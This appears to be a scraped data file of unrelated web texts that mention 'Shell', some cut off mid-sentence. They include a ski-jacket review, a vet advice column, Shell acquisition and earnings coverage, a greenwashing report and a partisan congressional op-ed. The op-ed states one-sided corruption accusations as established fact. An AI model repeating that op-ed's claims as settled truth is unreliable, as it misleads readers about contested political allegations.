freeride-inspired cut that makes it easy to layer underneath. Second is durability, with both jackets using high-quality materials that stand up well to frequent use. Weather protection is also comparable between Helly Hansen's Helly Tech Professional membrane and Trew's PNW Primo technology, although neither jacket offers enough breathability for heart-pumping backcountry missions. In parsing out the differences, the Cosmic Primo is heavier by 4 ounces but tacks on two additional pockets, along with improved mobility thanks to added stretch in the fabric (for more, see our in-depth Cosmic Primo Jacket review). In the end, unless the added weight is a dealbreaker for you, we think the Cosmic Primo is the better all-around buy.\n\n\n\nTrew Gear's Cosmic Primo Jacket offers comparable performance to the Ridge Infinity for less | Credit: Jason Hummel\n\nArc'teryx's Sabre has topped our ski jacket rankings for years and remains one of the most premium options on the market. Compared to the Ridge Infinity, the Sabre's 3-layer Gore-Tex construction offers class-leading weather protection and holds up extremely well to long-term use. You also get a very similar feature set\u2014including six total pockets, a powder skirt, a Recco reflector, and an adjustable and helmet-compatible hood\u2014for around an ounce less than the Helly Hansen. The Sabre also tacks on a light flannel backer, which adds a nice dose of next-to-skin comfort alongside a modest dose of warmth. Only you can decide whether or not the Arc'teryx is worth an extra $100, but there's no denying the Sabre's overall quality and attention to detail.\n\n\n\nArc'teryx's Sabre leaves little to be desired from a quality standpoint but doesn't come cheap | Credit: Brian McCurdy\n\nLast but not least is Flylow Gear's Malone Jacket, which is a little more appealing for touring than it is for inbounds use but crosses over nicely between the two disciplines. The biggest difference between the Malone and Ridge Infinity is that the Flylow uses a stretchy, softshell-like construction (Flylow's 3L Tactic membrane) that offers standout comfort. It's not as impervious as the Ridge Infinity's Helly Tech build, but the upside is excellent mobility and a much softer next-to-skin feel. We also think Flylow nailed the styling of the Malone\u2014particularly in the tri-color patterns\u2014and all the materials have impressed us from a quality standpoint. For primarily resort-goers who live in particularly wet climates, we think the Ridge Infinity is worth the price and weight penalties. But for mixed in- and out-of-bounds use, especially in areas that see a lot of dry snow (like the Rocky Mountains), the Flylow is more versatile.",

I\u2019ve never had to take them to the vet but recently, one of them developed a hole in their carapace on the underside. I made some calls but not many vets treat turtles. I tried to do some research to look for possible cases but more importantly to try and repair the defect. Do you have any suggestions as to likely causes and what I should do? Also, my nephew has a cat that has had only dry food for 10 years. Is this adequate? The cat seems underweight to me, so I ask. J.N.\n\nDear J.N.,\n\nThe most common causes for turtle shell defects are trauma, bacterial or fungal infections, poor hygiene sometimes caused by stagnant dirty water, and nutritional deficiencies mostly due to insufficient Vitamin D3 or calcium in the diet. There are veterinarians that specialize in herpetology and exotics, and I would look into nearby veterinary schools such as Tufts or any wildlife centers. They should be able to see your turtle and make a diagnosis and set up appropriate treatment.\n\nI would urge you not to take matters into your own hands and let the veterinarian set up a repair of the shell defect. Typically, one uses epoxy with a fiberglass mesh. The epoxy best suited to this kind of repair should be waterproof and biologically compatible. Agents needed for infection may also need to be applied beforehand or simultaneously. There are also some commercial products on the market that can be used. It is important to address the situation and not let it fester.\n\nAs for the cat, dry foods are excellent sources of a well-balanced and nutritious diet if they are from quality manufacturers. There is no need to change the diet, and it is better when it comes to promoting better dental health as the cat ages. If the cat seems underweight, I am sure their veterinarian would take appropriate steps to diagnose any disorder or cause of any weight loss, perceived or real and treat as necessary. Good luck.\n\nDr. John de Jong is President of the World Veterinary Association. He owns and operates the Boston Mobile Veterinary Clinic and can be reached at 781-899-9994.",

The groups noted that power demand is expected to increase in the ISO New England market due to growing decarbonization efforts in sectors such as home heating and transportation.\n\nThis acquisition allows Shell to continue an energy supply agreement that has been in place since 2019 and secure long-term energy offtake from the plant, which is located near Providence. The deal maintains Shell\u2019s position in the ISO New England power market. It also preserves SENA\u2019s current operations and mitigates market risk by ensuring a reliable and stable power generation source.\n\nRISEC\u2019s two-unit combined-cycle gas turbine power plant has a maximum capacity of 609 MW and an average operating capacity of 594 MW. The plant has operated since 2002.\n\nThe acquisition is projected to generate an internal rate of return well in excess of the hurdle rate set for Shell\u2019s Power business.

            "content": "Crude oil prices are expected to slip in 2025, continuing the trend from 2024, which saw prices dragged down by weak Chinese demand and a supply glut. The International Energy Agency (IEA) forecasted global oil demand to grow by under a million barrels per day in 2025, a significant slowdown compared to the two million barrels per day increase in 2023. Commonwealth Bank of Australia expects Brent oil prices to fall to $70 per barrel this year, citing increased oil supply from non-OPEC+ countries that will likely outpace the rise in global oil consumption. BMI noted that the first half of 2025 is likely to see a supply glut as substantial new production from the U.S., Canada, Guyana, and Brazil comes online. If OPEC+ plans to roll back voluntary cuts materialize, the oversupply will further pressure prices.\n\nGlobal natural gas prices have rallied since mid-December 2024, driven by cold weather and geopolitical tensions. Ukraine\u2019s recent halt of Russian gas flow to several European nations on New Year\u2019s Day has introduced greater uncertainty to the global gas markets. As long as the cutoff remains in place, gas prices are likely to remain elevated. BMI forecasts gas prices to rise by about 40% in 2025 to $3.4 per million British thermal units (MMBtu), driven by growing demand from the LNG sector and higher net pipeline exports. LNG will continue to drive new consumption, supported by rising export capacity and strong demand in Europe and Asia, according to BMI analysts.\n\nGold prices, which notched a series of all-time highs in 2024, are expected to continue their upward trajectory in 2025. Adrian Ash, director of research at BullionVault, a gold investment services firm, attributes this optimism to investors\u2019 pessimism about geopolitics and government debt. Gold\u2019s role as a hedge against risk and inflation makes it an attractive asset in uncertain times. JPMorgan analysts also forecast a rise in gold prices, particularly if U.S. policies become more disruptive, leading to increased tariffs, elevated trade tensions, and higher risks to economic growth. Gold prices, which rose about 26% in 2024, are forecast to reach $3,000 per ounce in 2025.\n\nAccording to Sabrin Chowdhury, the head of commodities analysis at BMI, commodities in general will face pressure across the board in 2025. The strength of the U.S. dollar is expected to cap demand for commodities priced in the greenback, making them more expensive for buyers using other currencies. This trend is likely to be exacerbated by a sluggish global economic outlook, which will dampen demand for raw materials and energy resources.\n\nThe year 2025 is shaping up to be a mixed bag for commodity markets. While global commodity prices are largely expected to fall due to a sluggish economic outlook and a resurgent U.S. dollar, certain commodities such as gold and gas are poised for a rally. Industry experts and market participants are closely monitoring these trends, particularly in the context of China\u2019s economic policies and global geopolitical developments.\n\nWe recently compiled a list of the 10 Best Commodity Stocks to Invest in According to Hedge Funds . In this article, we are going to take a look at where Shell plc (NYSE: SHEL ) stands against other best commodity stocks to invest in according to hedge funds.\n\nStory Continues\n\nSilver is expected to see price increases in 2025, driven by strong industrial demand. Silver is used in a variety of applications, including solar panels, automobiles, jewelry, and electronics. The demand for solar power, in particular, is expected to remain resilient, and the metal\u2019s supply is limited.\n\nCopper, a key material in the manufacturing of electric vehicles and power grids, may see a dent in prices in 2025. The metal reached a record high in May 2024, largely due to a squeezed market and the global energy transition. However, a potential deceleration in the energy transition, driven by policy shifts, might dampen the \u201cgreen sentiment\u201d that bolstered prices in 2024. John Gross, president of John Gross and Company, a metals management consultancy, expects copper prices to trend lower in 2025 due to a cocktail mix of high interest rates, elevated interest rates, and a stronger dollar, which will weigh on all metals markets.\n\nIron ore prices are forecast to drop in 2025, driven by an oversupply resulting from Chinese policies and geopolitical factors. Goldman Sachs expects prices to decline to $95 per ton in 2025, citing the expected U.S. tariffs on China, the changing nature of Chinese stimulus, and the introduction of new low-cost supply. Despite China likely importing a record amount of iron ore this year, the market is expected to move into a surplus, leading to a decline in prices.\n\nThe global commodity markets in 2025 are expected to be characterized by a mix of trends, with some commodities facing headwinds while others continue to rally. However, commodities are a solid investment option due to their inherent scarcity and long-term value as demand continues to grow.\n\nWhy Shell plc (SHEL) Is One of the Best Commodity Stocks to Invest in According to Hedge Funds?\n\nA gas refinery lit up against the night sky, showing the scale of the company's petrochemical operations.\n\nOur Methodology\n\nTo compile our list of the 10 best commodity stocks to invest in according to hedge funds, we used commodities ETFs to compile a list of 25 companies that are involved in mining, trading or processing of commodities.

            "content": "\"Clearly there's a major problem when projects actively manipulate data, which a supposedly rigorous audit process fails to detect\"\n\nGlobal oil company Shell is under fire for deceiving the public about its carbon pollution and using greenwashing in its marketing.\n\nWhat's happening?\n\nFor a period of two years, Shell shipped liquefied natural gas to buyers as part of a promotional campaign and claimed that it was carbon-neutral.\n\nBut according to a new report from Climate Home News and Dialogue Earth, no successful action was taken to reduce the carbon pollution that results from LNG production. Instead, Shell used millions of \"phantom\" carbon credits to cancel out the emissions on paper.\n\nThe company pledged to cut down on the release of methane gas from rice paddies in eastern China by introducing an improved crop irrigation method. This would offset the carbon pollution from Shell's LNG. But these rice cultivation projects failed to work as intended or were never implemented in the first place.\n\nThrough interviews with local farmers and authorities, Climate Home and Dialogue Earth discovered \"a string of failures in their implementation\" and that Shell has not followed through on its plans to reduce its pollution.\n\n\"Clearly there's a major problem when projects actively manipulate data, which a supposedly rigorous audit process fails to detect, thereby erroneously generating millions of phantom credits for Shell to greenwash its LNG,\" Jonathan Crook, a policy expert at Carbon Market Watch, told Climate Home.\n\nWhy is it concerning?\n\nAs a fuel source, liquefied natural gas produces a larger carbon footprint than coal, emitting dangerous levels of carbon dioxide and methane.\n\nSome of the LNG shipped to buyers as a part of this campaign was sold with a \"net-zero solution\" claim under Shell's \"green\" label. This greenwashing was harmful and misleading to the public.\n\nShell has also recently been accused of using greenwashing in advertising in the United Kingdom. For tips on spotting these tactics taken by corporations, review resources such as TCD's guide on greenwashing.\n\nWhat's being done about it?\n\nVerra, a carbon credit registry, has reviewed Shell's actions for verification. In 2024, Verra said it found issues and failures with the rice farming projects and suspended them. Verra said it would impose \"significant sanctions\" against those involved.\n\nClimate Home and Dialogue Earth raised concern over this because Verra approved the projects and let them continue for two years before taking action. This could harm Verra's reputation and credibility, especially since it oversees thousands of other carbon credit projects.\n\n\"By the time Verra cancelled the Chinese rice projects, more than 1.6 million credits generated by the projects had been used to offset the equivalent of the annual CO2 emissions of four gas-powered plants,\" Climate Home said.\n\n\"This is yet another example showing that we really cannot trust the industry to make sure that those carbon credits are actually reducing emissions, and, instead, we should force them to address their pollution at source, by curtailing their fossil fuel production and sales,\" Laurie van der Burg, global public finance manager for Oil Change International, told Climate Home.\n\nJoin our free newsletter for good news and useful tips, and don't miss this cool list of easy ways to help yourself while helping the planet.",

            "content": "WASHINGTON\u2014In an op-ed published today on Fox News, House Committee on Oversight and Government Reform Chairman James Comer (R-Ky.) outlines how President Joe Biden\u2019s pardons of the Biden Crime Family serve as a confession of their corruption as they sold out the American people to enrich themselves. Despite outlandish claims of \u201cno evidence\u201d by legacy media and denials by President Biden, the House Oversight Committee\u2019s investigation of the Bidens\u2019 influence peddling racket uncovered that the Bidens and their associates raked in over $30 million by selling access to Joe Biden around the world. Chairman Comer writes in the op-ed that President Biden will go down as the most corrupt president in U.S. history, and the Oversight Committee\u2019s investigation will be remembered as one of the most successful ever conducted by Congress.\n\nThis week, President Biden followed his unprecedented pardon of his son, Hunter Biden, by issuing additional preemptive pardons to family members, dating back to his time as vice president. These preemptive pardons for the Biden Crime Family serve as a confession of their corruption as they sold out the American people to enrich themselves. In fact, Biden\u2019s own Justice Department has argued that accepting a pardon implies an admission of guilt.\n\nWhen we started our investigation of Joe Biden and his family\u2019s influence peddling schemes, the narrative peddled by legacy media was that the contents of Hunter Biden\u2019s laptop were disinformation. Joe Biden claimed that his family\u2019s business dealings were \u201cethical.\u201d But our investigation blew through these lies and more as we followed the money trail and conducted a forensic accounting of the Biden family \u201cbusiness.\u201d\n\nDuring our investigation, the House Oversight Committee reviewed hundreds of pages of documents at the U.S. Department of the Treasury generated by the Bidens\u2019 and their associates\u2019 high-dollar transactions. These documents are filed by experts at banks when there is evidence of potential money laundering or other criminal activity. Additionally, we obtained the bank records for Hunter Biden, James Biden, their shell companies, and business associates.\n\nBank records don\u2019t lie. Through these records, we identified over 20 shell companies that the Bidens and their associates created \u2013 most of which were created after Joe Biden became Vice President of the United States. The Bidens and their associates then used these shell companies to accept payments from foreign entities and individuals. Once the payments arrived in the shell companies\u2019 bank accounts, they would then launder money in incremental payments to members of the Biden family. In fact, we identified ten members of the Biden family who benefited from these schemes, including Joe Biden.\n\nIncluding loans that do not appear to have been paid back, the Biden family\u2019s enrichment scheme generated over $30 million in payments to the Bidens and their associates from corrupt foreign entities and individuals in China, Russia, Ukraine, Romania, and Kazakhstan. What were they selling? Access to Joe Biden and his influence.\n\nAfter we obtained the bank records, the Oversight Committee hauled in members of the Biden family and their associates for testimony. Multiple Biden family associates confirmed Joe Biden was \u201cthe brand\u201d sold around the world and helped close the Bidens\u2019 deals with foreign nationals.\n\nDevon Archer, a Biden family associate, confirmed during a transcribed interview that when Joe Biden was Vice President, Joe Biden dined with Russian oligarch Yelena Baturina, Kazakhstani oligarch Kenes Rakishev, and Burisma\u2019s corporate secretary Vadym Pozharsky at Caf\u00e9 Milano in Washington, D.C. These dinners occurred shortly before or after the foreign nationals or their affiliated entities were collectively paying Joe Biden\u2019s son, Hunter Biden, millions of dollars. Then-Vice President Joe Biden also met with Jonathan Li, a Chinese national who was Hunter Biden\u2019s associate, and wrote a college letter of recommendation for his daughter. Even when presented with this evidence, President Biden continued to lie to the American people.\n\nRob Walker, a Biden family associate who was involved in the Bidens\u2019 dealings with Chinese and Romanian entities, confirmed during a transcribed interview that Joe Biden met with the now-missing Chairman of CEFC, Ye Jianming, as Hunter Biden and his associates received $3 million from a Chinese entity CEFC controlled.\n\nJason Galanis, another Biden family business associate, testified that Hunter Biden put his father on speakerphone with Yelena Baturina. Joe Biden ended the call by stating, \u201cOk then, you be good to my boy.\u201d A few days later, Baturina committed to a \u201chard order\u201d of $10-20 million to an entity benefitting Hunter Biden.\n\nTony Bobulinski articulated under oath that Joe Biden was \u201cthe brand\u201d the Bidens sold to enrich the family. Joe Biden not only knew about his family\u2019s dealings with a Chinese Communist Party-linked energy company, but he also enabled them and participated in them. Tony Bobulinski testified he believes Joe Biden committed wrongdoing and continues to lie to the American people about his participation in his family\u2019s influence peddling schemes.\n\nAs we presented all this evidence to the American people in a transparent way, the legacy media claimed there was \u201cno evidence\u201d of wrongdoing by Joe Biden and his family. Joe Biden\u2019s pardons of his family serve as an indictment of the legacy media who lost all credibility as they covered up Joe Biden and his family\u2019s abuse of power, corruption, and obstruction. Following Joe Biden\u2019s pardons, even former President Obama\u2019s chief of staff, Bill Daley, said it \u201cconfirms that there are serious concerns about culpability.\u201d\n\nThe American people have seen through the Bidens\u2019 lies and the legacy media\u2019s coverup, and they know the truth: President Biden abused his public office to create a slush fund for his family. President Biden will go down as the most corrupt president in U.S. history, and our investigation will be remembered as one of the most successful ever conducted by Congress. Indeed, Joe Biden\u2019s final act in office\u2014pardoning his family\u2014confirms it.\n\nRep. James Comer (R-Ky.) is Chairman of the House Committee on Oversight and Government Reform.",

It is a vertically integrated and diversified company operating in all aspects of the oil industry. It is counted among the \u201csuper-majors\u201d and one of the world\u2019s largest companies in terms of scope, revenue and earnings. It is listed on the London LSE, the Amsterdam Euronext and the New York Stock Exchange.\n\nRoyal Dutch Shell plc was founded in 1907 because of Standard Oil\u2019s growth and growing global dominance. It is a merger of the Royal Dutch Petroleum Company (founded in 1890) and The \u201cShell\u201d Transport Compay, founded in 1897. The Royal Dutch Petroleum Company was engaged in oil operations in southeast Asia while The \u201cShell\u201d Transport Company was a family-owned import business focused initially on seashells.\n\nThe two operating segments of Royal Dutch Shell were not legally unified as a business for several reasons but acted as one company in all operations. The Royal Dutch Petroleum end of operations was responsible for the exploration and production of oil liquids and gasses while The \u201cShell\u201d Transport Company was responsible for transport and storage.\n\nThe company purchased assets from the Rothschilds in 1912 boosted operations by more than double. This led to explosive growth but the WWI years were hard on the company. More than 15% of its global operations were destroyed and had to be rebuilt or replaced, an issue it will have to deal with more than once as it expands around the globe. By 1930, Royal Dutch Shell was the world's largest producer of petroleum products and chemicals, a standing it will maintain for many years.\n\nThe company was known as one of the 7 Sisters which dominated the oil market between 1940 to 1970 and in 1970 it helped to pioneer oceanic transport of liquified natural gas. It maintained its dual status with operations, headquarters and listing in both London and the Netherlands until 2005. In 2005 it unified and became a single entity with its headquarters in The Hague, the Netherlands. That status lasted until 2022 when it unified once again, this time its Class A and Class B shares, and moved its headquarters to London.\n\nToday Shell plc operates as a diversified energy company with global operations. It operates through 4 key segments that are Integrated Gas, Upstream, Oil Products and Chemicals. The Gas and Upstream segments explore for and extract petroleum products while the Oil Products and Chemicals segments refine, store, transport and markets feedstocks, fuel products and petrochemicals. At the end of 2021, the company had just over 9 billion in proven reserves, a figure that had been in decline for 6 years.",

The current Zacks Consensus Estimate for the to-be-reported quarter is earnings of $1.78 per share on revenues of $80.1 billion.\n\n\n\nFind the latest EPS estimates and surprises on Zacks Earnings Calendar.\n\n\n\nLet\u2019s delve into the factors that might have influenced the integrated energy behemoth\u2019s results in the December quarter. But it\u2019s worth taking a look at SHEL\u2019s previous-quarter performance first.\n\nHighlights of Q3 Earnings & Surprise History\n\nIn the last reported quarter, Europe\u2019s largest oil company beat the consensus mark, backed by strong production and higher LNG sales. SHEL had reported earnings per ADS (on a current cost of supplies basis, excluding items \u2014 the market\u2019s preferred measure) \u2014 of $1.92, well above the Zacks Consensus Estimate of $1.72. However, revenues of $72.5 billion came in 14.3% below the Zacks Consensus Estimate due to weaker commodity prices and a significant drop in the Chemicals and Products\u2019 performance.\n\n\n\nShell beat the Zacks Consensus Estimate for earnings in each of the last four quarters, resulting in an earnings surprise of 15.4%, on average. This is depicted in the graph below:\n\nShell PLC Unsponsored ADR Price and EPS Surprise\n\nShell PLC Unsponsored ADR Price and EPS Surprise\n\nShell PLC Unsponsored ADR price-eps-surprise | Shell PLC Unsponsored ADR Quote\n\nTrend in Estimate Revision\n\nThe Zacks Consensus Estimate for the third-quarter bottom line has remained unchanged in the past seven days. The estimated figure indicates a 19.8% drop year over year. The Zacks Consensus Estimate for revenues, meanwhile, suggests essentially no change from the year-ago period.\n\nFactors to Consider\n\nEarlier this month, Shell released a preliminary report for the October-December period, which flagged significant hurdles across its integrated gas, renewables, and oil trading divisions, which are expected to impact overall performance.\n\n\n\nDeclining Gas Earnings and Production Guidance: Shell has warned of a sharp decline in earnings from its Integrated Gas division compared to the $2.87 billion reported in Q3 2024. This is primarily attributed to the expiry of hedging contracts that shielded the company from volatile market conditions during the Russia-Ukraine conflict. Additionally, natural gas production is projected to fall to 880,000-920,000 barrels of oil equivalent per day from 941,000 in the previous quarter, due to maintenance at Qatar\u2019s Pearl GTL plant. Liquefied natural gas (LNG) volumes are also expected to decline to 6.8-7.2 million metric tons from 7.5 million, reflecting reduced feedgas deliveries and fewer cargoes.\n\n\n\nImpairments and Cash Flow Challenges: Shell has announced plans to record a non-cash, post-tax impairment of $1.5 billion to $3 billion, with up to $1.2 billion stemming from its renewables division. This reflects the challenges faced by its offshore wind and energy solutions business, which struggled to achieve consistent profitability in 2024. Adding to the strain, the company anticipates a $1.3 billion hit to cash flow from operations due to emission-permit payments in Germany and the United States, a recurring Q4 expense.\n\n\n\nLower Trading and Seasonal Weakness: Shell\u2019s trading operations in both the Integrated Gas and Oil Products divisions are expected to post significantly weaker results than in Q3. Seasonal declines in demand and the expiration of hedging contracts have weighed on performance, while chemicals margins have remained depressed. These factors contribute to what Shell itself describes as a \"soft\" quarter, a sentiment echoed by market analysts who anticipate earnings downgrades.",

            "content": "HOUSTON, Jan. 24, 2025 /PRNewswire/ -- Shell Energy North America (US), L.P. (SENA), a subsidiary of Shell plc (Shell), has completed the previously announced 100% equity stake acquisition of RISEC Holdings, LLC (RISEC), which owns a 609-megawatt (MW) two-unit combined-cycle gas turbine power plant in Rhode Island, USA.\n\nThis acquisition maintains SENA's position in the deregulated Independent System Operator New England (ISO New England) power market, securing long-term supply and capacity offtake for Shell. In the coming decades, power demand is expected to increase in the ISO New England market due to growing decarbonization efforts in sectors such as home heating and transportation.\n\nThe acquisition has been absorbed within Shell's cash capital expenditure guidance, which remains unchanged.\n\nNotes to editors\n\nThis acquisition allows Shell to continue an energy supply agreement that has been in place since 2019 and secure long-term energy offtake from the plant, maintaining Shell's position in the ISO New England power market. The acquisition preserves SENA's current operations and mitigates market risk by ensuring a reliable and stable power generation source.\n\nRISEC's two-unit combined-cycle gas turbine power plant has a maximum capacity of 609 MW and an average operating capacity of 594 MW. Serving the ISO New England market, the plant is located outside Providence, Rhode Island , and has been in operation since its completion in 2002.\n\n, and has been in operation since its completion in 2002. Combined-cycle gas turbine power plants generate electricity via gas turbines, and capture waste heat to produce steam, which drives steam turbines for additional power: a process which enhances efficiency and reduces emissions compared to single-cycle power plants. Such plants provide reliable, flexible power, which balances the intermittency of renewable energy sources like wind and solar.\n\nThe acquisition is projected to generate an internal rate of return well in excess of the hurdle rate set for Shell's Power business.\n\nPrior to the transaction, the parent company of RISEC was 51% owned by funds managed by global investment firm Carlyle. Prior to the transaction, the remaining 49% owner of RISEC was EGCO RISEC II, LLC, a subsidiary of Electricity Generating Public Company Limited (EGCO), a Thai public limited company.\n\nSENA is a full-service energy company providing energy solutions across all aspects of the market. SENA has been active in North American wholesale energy markets for over 25 years and is a market leader in wholesale and retail power, natural gas, and environmental products.\n\nCautionary note\n\nThe companies in which Shell plc directly and indirectly owns investments are separate legal entities. In this press release \"Shell\", \"Shell Group\" and \"Group\" are sometimes used for convenience where references are made to Shell plc and its subsidiaries in general. Likewise, the words \"we\", \"us\" and \"our\" are also used to refer to Shell plc and its subsidiaries in general or to those who work for them. These terms are also used where no useful purpose is served by identifying the particular entity or entities. ''Subsidiaries'', \"Shell subsidiaries\" and \"Shell companies\" as used in this press release refer to entities over which Shell plc either directly or indirectly has control.

All statements other than statements of historical fact are, or may be deemed to be, forward-looking statements. Forward-looking statements are statements of future expectations that are based on management's current expectations and assumptions and involve known and unknown risks and uncertainties that could cause actual results, performance or events to differ materially from those expressed or implied in these statements. Forward-looking statements include, among other things, statements concerning the potential exposure of Shell to market risks and statements expressing management's expectations, beliefs, estimates, forecasts, projections and assumptions. These forward-looking statements are identified by their use of terms and phrases such as \"aim\"; \"ambition\"; ''anticipate''; ''believe''; \"commit\"; \"commitment\"; ''could''; ''estimate''; ''expect''; ''goals''; ''intend''; ''may''; \"milestones\"; ''objectives''; ''outlook''; ''plan''; ''probably''; ''project''; ''risks''; \"schedule\"; ''seek''; ''should''; ''target''; ''will''; \"would\" and similar terms and phrases. There are a number of factors that could affect the future operations of Shell and could cause those results to differ materially from those expressed in the forward-looking statements included in this press release including (without limitation): (a) price fluctuations in crude oil and natural gas; (b) changes in demand for Shell's products; (c) currency fluctuations; (d) drilling and production results; (e) reserves estimates; (f) loss of market share and industry competition; (g) environmental and physical risks; (h) risks associated with the identification of suitable potential acquisition properties and targets, and successful negotiation and completion of such transactions; (i) the risk of doing business in developing countries and countries subject to international sanctions; (j) legislative, judicial, fiscal and regulatory developments including regulatory measures addressing climate change; (k) economic and financial market conditions in various countries and regions; (l) political risks, including the risks of expropriation and renegotiation of the terms of contracts with governmental entities, delays or advancements in the approval of projects and delays in the reimbursement for shared costs; (m) risks associated with the impact of pandemics, such as the COVID-19 (coronavirus) outbreak, regional conflicts, such as the Russia-Ukraine war, and a significant cybersecurity breach; and (n) changes in trading conditions. No assurance is provided that future dividend payments will match or exceed previous dividend payments. All forward-looking statements contained in this press release are expressly qualified in their entirety by the cautionary statements contained or referred to in this section. Readers should not place undue reliance on forward-looking statements. Additional risk factors that may affect future results are contained in Shell plc's Form 20-F for the year ended December 31, 2023 (available at www.shell.com/investors/news-and-filings/sec-filings.html and www.sec.gov). These risk factors also expressly qualify all forward-looking statements contained in this press release and should be considered by the reader. Each forward-looking statement speaks only as of the date of this press release January 24, 2025. Neither Shell plc nor any of its subsidiaries undertake any obligation to publicly update or revise any forward-looking statement as a result of new information, future events or other information. In light of these risks, results could differ materially from those stated, implied or inferred from the forward-looking statements contained in this press release.\n\nShell's Net Carbon Intensity\n\nAlso, in this press release we may refer to Shell's \"Net Carbon Intensity\" (NCI), which includes Shell's carbon emissions from the production of our energy products, our suppliers' carbon emissions in supplying energy for that production and our customers' carbon emissions associated with their use of the energy products we sell. Shell's NCI also includes the emissions associated with the production and use of energy products produced by others which Shell purchases for resale. Shell only controls its own emissions. The use of the terms Shell's \"Net Carbon Intensity\" or NCI are for convenience only and not intended to suggest these emissions are those of Shell plc or its subsidiaries.\n\nShell's net-zero emissions target\n\nShell's operating plan, outlook and budgets are forecasted for a ten-year period and are updated every year. They reflect the current economic environment and what we can reasonably expect to see over the next ten years. Accordingly, they reflect our Scope 1, Scope 2 and NCI targets over the next ten years. However, Shell's operating plans cannot reflect our 2050 net-zero emissions target, as this target is currently outside our planning period. In the future, as society moves towards net-zero emissions, we expect Shell's operating plans to reflect this movement. However, if society is not net zero in 2050, as of today, there would be significant risk that Shell may not meet this target.\n\nForward-looking non-GAAP measures\n\nThis press release may contain certain forward-looking non-GAAP measures such as cash capital expenditure and divestments. We are unable to provide a reconciliation of these forward-looking non-GAAP measures to the most comparable GAAP financial measures because certain information needed to reconcile those non-GAAP measures to the most comparable GAAP financial measures is dependent on future events some of which are outside the control of Shell, such as oil and gas prices, interest rates and exchange rates. Moreover, estimating such GAAP measures with the required precision necessary to provide a meaningful reconciliation is extremely difficult and could not be accomplished without unreasonable effort. Non-GAAP measures in respect of future periods which cannot be reconciled to the most comparable GAAP financial measure are calculated in a manner which is consistent with the accounting policies applied in Shell plc's consolidated financial statements.\n\nThe contents of websites referred to in this press release do not form part of this press release.\n\nWe may have used certain terms, such as resources, in this press release that the United States Securities and Exchange Commission (SEC) strictly prohibits us from including in our filings with the SEC. Investors are urged to consider closely the disclosure in our Form 20-F, File No 1-32575, available on the SEC website www.sec.gov.\n\nSOURCE Shell",

            "content": "Shell Factory animals find new 'forever homes' in Bonita Springs, North Fort Myers\n\nThe Shell Factory closed months ago. But animal lovers can still visit some of the North Fort Myers attraction\u2019s most popular animals here in Southwest Florida.\n\nThe Holstein steer Moo loves hanging out with sheep, chickens and cows at North Fort Myers farm Blossom & Brie.\n\nSeveral Shell Factory birds spend their days happily munching fruit and bird feed at Bonita Springs' Wonder Gardens.\n\nAnd Lee County Jail inmates learn new skills every day caring for lemurs, coatimundi and other critters in the Nan\u2019s Ranch program in North Fort Myers.\n\nAll three places offered homes to The Shell Factory & Nature Park's animals when the Lee County tourist attraction announced in September that it was shutting down for good. It closed later that month.\n\nSouthwest Florida steps up to save The Shell Factory's animals\n\nFor Kaitlyn Henry of Wonder Gardens, it was all about giving those animals a good home. But she also thought about The Shell Factory's hard-working employees.\n\n\u201cWhat happened with The Shell Factory closing \u2014 I\u2019m still in disbelief about it,\u201d says Henry, director of living collections at Wonder Gardens. \u201cI just feel for the staff that have been there so long and have been so dedicated to the animals. \u2026 I know that the staff were breathing a little easier knowing that (the animals) had a good spot to go to.\u201d\n\nMost of the nature park's more than 350 animals went to venues outside of Southwest Florida, including Gatorama in Palmdale; Wilderness Trails Zoo in Birch Run, Michigan; and Grizzly Ranch in Hartford, Alabama.\n\nBut all three Southwest Florida venues said they wanted to help keep some animals in Lee and Collier counties, too.\n\n\u201cThey put out this SOS to surrounding parks and sanctuaries asking for help\u2026,\u201d says Julie Sin, spokeswoman for the Lee County Sheriff\u2019s Office, which runs Nan\u2019s Ranch. \u201cWe know how much Fort Myers loves The Shell Factory \u2026 so we wanted to be able to keep those animals here in town for our residents to still enjoy and be able to see.\u201d\n\nHow are The Shell Factory animals doing?\n\nMonths after moving into their new homes, the animals seem to be doing great and getting along with visitors and their new \u201croommates.\u201d\n\nThe massive, 13-year-old steer Moo has proven to be one of the more popular animals at Blossom & Brie. People often pose for photos with him.\n\n\u201cHe\u2019s such a giant,\u201d says co-owner Stacey Poole. \u201cHe\u2019s 1,600 pounds. He is giant compared to our other cows. But he\u2019s also just the sweetest.\n\n\u201cYou can rub his nose \u2014 if you can reach his nose! Not everybody can. He is just a joy to have around.\u201d\n\nThe same goes for the animals at Wonder Gardens: Keel-billed toucan Rita, Moluccan cockatoo Dusty, a blue-crowned pigeon, a violet tiraco and five aquatic turtles.\n\nHenry hates to assign human emotions to animals, she says, but the birds do seem happy. They\u2019re eating well and paying close attention to visitors or their keepers.\n\n\u201cThey\u2019re interacting really well with the other birds,\u201d she says. \u201cThey\u2019re interacting with guests \u2014 very curious.\u201d\n\nAt Nan\u2019s Ranch, the animals joined the 80-plus other animals already there. Those Shell Factory animals include two ring-tailed lemurs, two coatimundi, a three-banded armadillo and a bare-eyed cockatoo named Sticky Buns.\n\nLee County Jail inmates work closely with the animals. And Southwest Florida residents can visit them there, too, by scheduling a tour.\n\n\u201cThey\u2019re doing really well,\u201d Sin says about the animals. \u201cThey feel right at home.\u201d\n\nTo learn more about the venues and how to visit, go to wondergardens.org (Wonder Gardens), sheriffleefl.org/nans-ranch (Nan\u2019s Ranch) or blossomandbrie.com (Blossom & Brie).\n\nCharles Runnells is an arts and entertainment reporter for The News-Press and the Naples Daily News.

This responsibility often comes with stressors that take a toll on the mental health of these employees. Shell Point\u2019s commitment to provide top-notch care extends beyond the residents themselves. The executive committee places a high priority on the well-being of its administrative personnel and other staff members within the community, offering them the tools and programs to maintain both their physical and emotional health.\n\n\u201d Shell Point\u2019s commitment to positive aging extends far beyond the day-to-day care we provide our residents, as we also care deeply about those who visit and work here at Shell Point. The Mind Pod is a wonderful resource available to everyone who enters, and we\u2019re pleased to see it have such an immediate and positive impact on those who use the Mind Pod to improve their mental well-being.\u201d\n\n\u2013 Sarah Owen, Shell Point\n\nSolution: In late-2024, Shell Point worked with an organization called Soul Happy to bring into its main lobby area an innovative new stressreduction tool called the Mind Pod. This therapeutic enclosure creates an engaging, sanctuary-like environment designed to immediately reduce stress levels of those who enter the enclosure. Red Dot Digital Media was brought in to help Shell Point\u2019s IT team customize the \u201cin-pod\u201d experience. Upon entering, individuals are asked to rate their current stress level and then asked to choose from a series of different videos intended to help them reduce anxiety, boost focus and transform their attitude. Videos include deep breathing exercises, introspection techniques, faith-based content and other calming videos, all of which help to center the individual and promote a sense of calm. Individuals are asked again to rate 